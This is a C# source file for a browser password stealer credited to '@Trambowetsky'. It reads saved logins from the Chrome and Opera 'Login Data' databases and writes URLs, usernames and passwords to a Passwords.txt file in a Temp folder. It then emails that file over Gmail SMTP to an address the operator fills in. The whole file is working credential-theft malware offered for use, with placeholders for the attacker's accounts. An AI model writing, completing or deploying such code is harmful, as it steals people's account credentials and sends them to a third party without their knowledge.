using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace PasswordStealer
{
    class Program
    {
        // Passwords.txt is stored in Temp folder in AppData
        private static string[] paths = { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                + @"\Google\Chrome\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                + @"\Opera Software\Opera Stable\Login Data"};
        private static string pwd_text = "";
        static void Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetTempPath() + "StealLog");

            PasswordReader();
            DeleteLogData();
            PasswordWriter();
            SendEmail();

        }

        private static void PasswordReader()
        {
            foreach (string folder in paths)
            {
                var pas = Passwords.ReadPass(folder);
                if (File.Exists(folder))
                {
                    pwd_text += "Stealer by: @Trambowetsky\r\n\r\n";
                    foreach (var item in pas)
                    {
                        if ((item.Item2.Length > 0) && (item.Item3.Length > 0))
                        {
                            pwd_text += $"URL: {item.Item1} \r\n Login: {item.Item2} \r\n Password: {item.Item3} \r\n";
                            pwd_text += "\r\n";
                        }
                    }
                }
            }
        }
        private static void DeleteLogData()
        {
            if (File.Exists(Path.GetTempPath() + @"StealLog\Login Data"))
                File.Delete(Path.GetTempPath() + @"StealLog\Login Data");
        }
        private static void PasswordWriter()
        {
            File.WriteAllText(Path.GetTempPath() + @"StealLog\Passwords.txt", pwd_text);
        }

        private static void SendEmail()
        {
            using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
            {
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtp.UseDefaultCredentials = false;
                smtp.Credentials = new NetworkCredential("login goes here", "password here"); // sender-email
                smtp.EnableSsl = true;
                MailMessage msg = new MailMessage("sender email", "your main email", // first arg - sender-email, second - email, that gets pswrds
                                                  "Log || Passwords", "Stealer by @Trambowetsky");

                msg.Attachments.Add(new Attachment(Path.GetTempPath() + @"StealLog\Passwords.txt"));

                try
                {
                    smtp.Send(msg);
                }
                catch (Exception e)
                { Console.WriteLine(e); };
            }
        }
    }
}
